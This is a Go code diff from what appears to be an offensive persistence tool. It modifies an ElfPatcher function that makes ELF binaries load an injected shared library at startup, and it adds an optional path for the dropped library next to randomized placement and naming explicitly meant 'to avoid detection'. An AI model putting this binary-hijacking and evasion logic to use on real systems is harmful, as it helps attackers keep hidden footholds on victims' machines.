@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"strconv"
 	"strings"
 
@@ -286,7 +287,8 @@ func patcher() (err error) {
 
 // ElfPatcher patches an ELF file to load a specific SO file on startup
 // This function allows users to patch arbitrary ELF files with custom SO libraries
-func ElfPatcher(elfPath, soPath string) error {
+// targetPath is optional - if empty, uses random path and filename
+func ElfPatcher(elfPath, soPath, targetPath string) error {
 	// Validate input paths
 	if !util.IsFileExist(elfPath) {
 		return fmt.Errorf("ELF file %s does not exist", elfPath)
@@ -306,25 +308,43 @@ func ElfPatcher(elfPath, soPath string) error {
 		log.Printf("Created backup: %s", backupPath)
 	}
 
-	// Generate a random storage location for the SO file
-	randomDir, err := common.GetRandomWritablePath()
-	if err != nil {
-		return fmt.Errorf("failed to get random writable path: %v", err)
-	}
+	var finalSOPath string
+	var err error
 
-	// Ensure the directory exists
-	err = os.MkdirAll(randomDir, 0755)
-	if err != nil {
-		return fmt.Errorf("failed to create directory %s: %v", randomDir, err)
-	}
+	if targetPath != "" {
+		// User specified target path - use it directly
+		finalSOPath = targetPath
 
-	// Generate random SO filename to avoid detection
-	randomSOName := common.NameTheLibrary()
-	if randomSOName == "" {
-		randomSOName = fmt.Sprintf("lib%s.so.%d", util.RandStr(8), util.RandInt(1, 99))
-	}
+		// Ensure the directory exists
+		targetDir := filepath.Dir(finalSOPath)
+		err = os.MkdirAll(targetDir, 0755)
+		if err != nil {
+			return fmt.Errorf("failed to create directory %s: %v", targetDir, err)
+		}
 
-	finalSOPath := fmt.Sprintf("%s/%s", randomDir, randomSOName)
+		log.Printf("Using user-specified target path: %s", finalSOPath)
+	} else {
+		// Generate a random storage location for the SO file
+		randomDir, err := common.GetRandomWritablePath()
+		if err != nil {
+			return fmt.Errorf("failed to get random writable path: %v", err)
+		}
+
+		// Ensure the directory exists
+		err = os.MkdirAll(randomDir, 0755)
+		if err != nil {
+			return fmt.Errorf("failed to create directory %s: %v", randomDir, err)
+		}
+
+		// Generate random SO filename to avoid detection
+		randomSOName := common.NameTheLibrary()
+		if randomSOName == "" {
+			randomSOName = fmt.Sprintf("lib%s.so.%d", util.RandStr(8), util.RandInt(1, 99))
+		}
+
+		finalSOPath = fmt.Sprintf("%s/%s", randomDir, randomSOName)
+		log.Printf("Using random target path: %s", finalSOPath)
+	}
 
 	// Copy SO file to random location
 	err = util.Copy(soPath, finalSOPath)
